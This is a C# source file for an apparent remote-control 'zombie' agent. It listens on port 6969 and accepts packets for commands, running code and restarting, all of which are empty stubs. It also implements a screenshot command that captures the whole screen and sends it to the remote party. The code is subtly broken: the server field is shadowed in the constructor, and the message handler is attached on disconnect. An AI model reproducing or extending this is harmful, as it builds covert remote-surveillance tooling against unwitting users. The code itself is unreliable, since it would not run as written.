using FirebridgeShared.Networking;
using System;
using System.Collections.Generic;
using System.Drawing;
using System.Drawing.Imaging;
using System.Linq;
using System.Net;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace FireBridgeZombie
{
    class Zombie
    {
        Server s;
        public Zombie()
        {
            Server s = new Server();
            s.ClientConnected += S_ClientConnected;
            s.ConnectionDisconnected += S_ConnectionDisconnected;
        }

        private void S_ConnectionDisconnected(object sender, EventArgs e)
        {
            var e2 = (ServerConnectionEventArgs)e;
            e2.Connection.MessageRecieved += Connection_MessageRecieved;
        }

        private void Connection_MessageRecieved(object sender, EventArgs e)
        {
            var packet = ((MessageEventArgs)e).Packet;
            var connection = (Connection)sender;
            switch (packet.Id)
            {
                case 0: //Message/Command
                    break;
                case 1: //Run Code
                    break;
                case 2: //Restart
                    break;
                case 3: //Screenshot
                    Rectangle bounds = Screen.GetBounds(Point.Empty);
                    using (Bitmap bitmap = new Bitmap(bounds.Width, bounds.Height))
                    {
                        using (Graphics g = Graphics.FromImage(bitmap))
                        {
                            g.CopyFromScreen(Point.Empty, Point.Empty, bounds.Size);
                        }
                        connection.SendPacket(new Packet() { Id = 3, Data = bitmap });
                    }
                    break;
                default:
                    Console.WriteLine("Unknown Packet of " + packet.Id);
                    connection.SendPacket(new Packet() { Id = 0, Data = "Unknown Packet of " + packet.Id });
                    break;
            }
        }

        private void S_ClientConnected(object sender, EventArgs e)
        {
            var e2 = (ServerConnectionEventArgs)e;
        }

        internal void Start()
        {
            s.Start(new IPEndPoint(IPAddress.Any, 6969));
            
        }
    }
}
